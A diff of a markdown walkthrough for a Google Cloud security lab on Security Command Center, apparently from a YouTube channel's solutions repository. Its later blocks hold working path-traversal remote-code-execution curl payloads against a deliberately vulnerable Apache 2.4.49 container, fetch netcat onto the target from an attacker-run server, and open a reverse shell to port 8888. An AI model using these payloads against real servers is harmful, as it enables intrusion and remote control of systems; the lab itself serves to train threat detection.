@@ -1,7 +1,7 @@
 
 # Detect and Investigate Threats with Security Command Center [GSP1125]
 
-# If you consider that the video helped you to complete your lab, so please do like and subscribe. https://www.youtube.com/@techcps
+# If you consider that the video helped you to complete your lab, so please do like and subscribe [Techcps](https://www.youtube.com/@techcps)
 
 * In the GCP Console open the Cloud Shell and enter the following commands:
 
@@ -15,7 +15,7 @@ export ZONE=
 
 ```
 gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID
-sleep 15
+sleep 17
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:demouser1@gmail.com --role=roles/bigquery.admin
 gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
@@ -24,14 +24,13 @@ export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
 --member=user:$USER_EMAIL \
 --role=roles/cloudresourcemanager.projectIamAdmin
-```
-```
+
 gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any
+```
 
+```
 gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description=subscribe to techcps and if you're cricketlover then follow cricketcps on social media pletform" --networks="default" --alternative-name-servers="" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
-```
 
-```
 gcloud compute ssh --zone "$ZONE" "instance-1" --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
 ```
 ## Note: Check the progress on task 1 & 2
@@ -94,71 +93,69 @@ kubectl describe daemonsets container-watcher -n kube-system
 kubectl create deployment apache-deployment \
 --replicas=1 \
 --image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable
+
 kubectl expose deployment apache-deployment \
---name apache-test-service \
+--name apache-test-service  \
 --type NodePort \
 --protocol TCP \
 --port 80
+
 NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
 NODE_PORT=$(kubectl get service apache-test-service \
 -o jsonpath={.spec.ports[0].nodePort})
+
 gcloud compute firewall-rules create apache-test-service-fw \
 --allow tcp:${NODE_PORT}
+
 gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
+```
+```
+curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+--path-as-is \
+--insecure \
+--data "echo Content-Type: text/plain; echo; id"
+
+curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+--path-as-is \
+--insecure \
+--data "echo Content-Type: text/plain; echo; ls -l /"
+
+curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+--path-as-is \
+--insecure \
+--data "echo Content-Type: text/plain; echo; hostname"
+
+gsutil cp \
+gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
+mkdir netcat-traditional
+dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
+
+LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+echo ${LOCAL_IP}
+
+python3 -m http.server --bind ${LOCAL_IP} \
+--directory ~/netcat-traditional/bin/ 8888 &
 ```
 
 ```
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; id"
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; ls -l /"
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; hostname"
-gsutil cp \
-gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
-mkdir netcat-traditional
-dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
-LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
-echo ${LOCAL_IP}
-python3 -m http.server --bind ${LOCAL_IP} \
---directory ~/netcat-traditional/bin/ 8888 &
-```
-```
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; id"
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; ls -l /"
-curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
---path-as-is \
---insecure \
---data "echo Content-Type: text/plain; echo; hostname"
-gsutil cp \
-gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
-mkdir netcat-traditional
-dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
-LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
-echo ${LOCAL_IP}
-python3 -m http.server --bind ${LOCAL_IP} \
---directory ~/netcat-traditional/bin/ 8888 &
-```
-```
 curl http://${LOCAL_IP}:8888
+
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"
+
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
 --insecure \
 --data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"
+
+```
+
+```
 pkill python
+```
+
+```
+lsof -i -sTCP:LISTEN
+
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
 --insecure \
@@ -168,15 +165,19 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ## Note: Open the new terminal
 
 ```
-export ZONE=
+nc -nlvp 8888
 ```
-```
-gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet --command "nc -nlvp 8888"
-```
+
 ## Note: Go back first terminal
 
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
+```
+
+## Note: Go back to second terminal
+
+```
+ls -l /
 ```
 
 # Congratulations, you're all done with the lab 😄
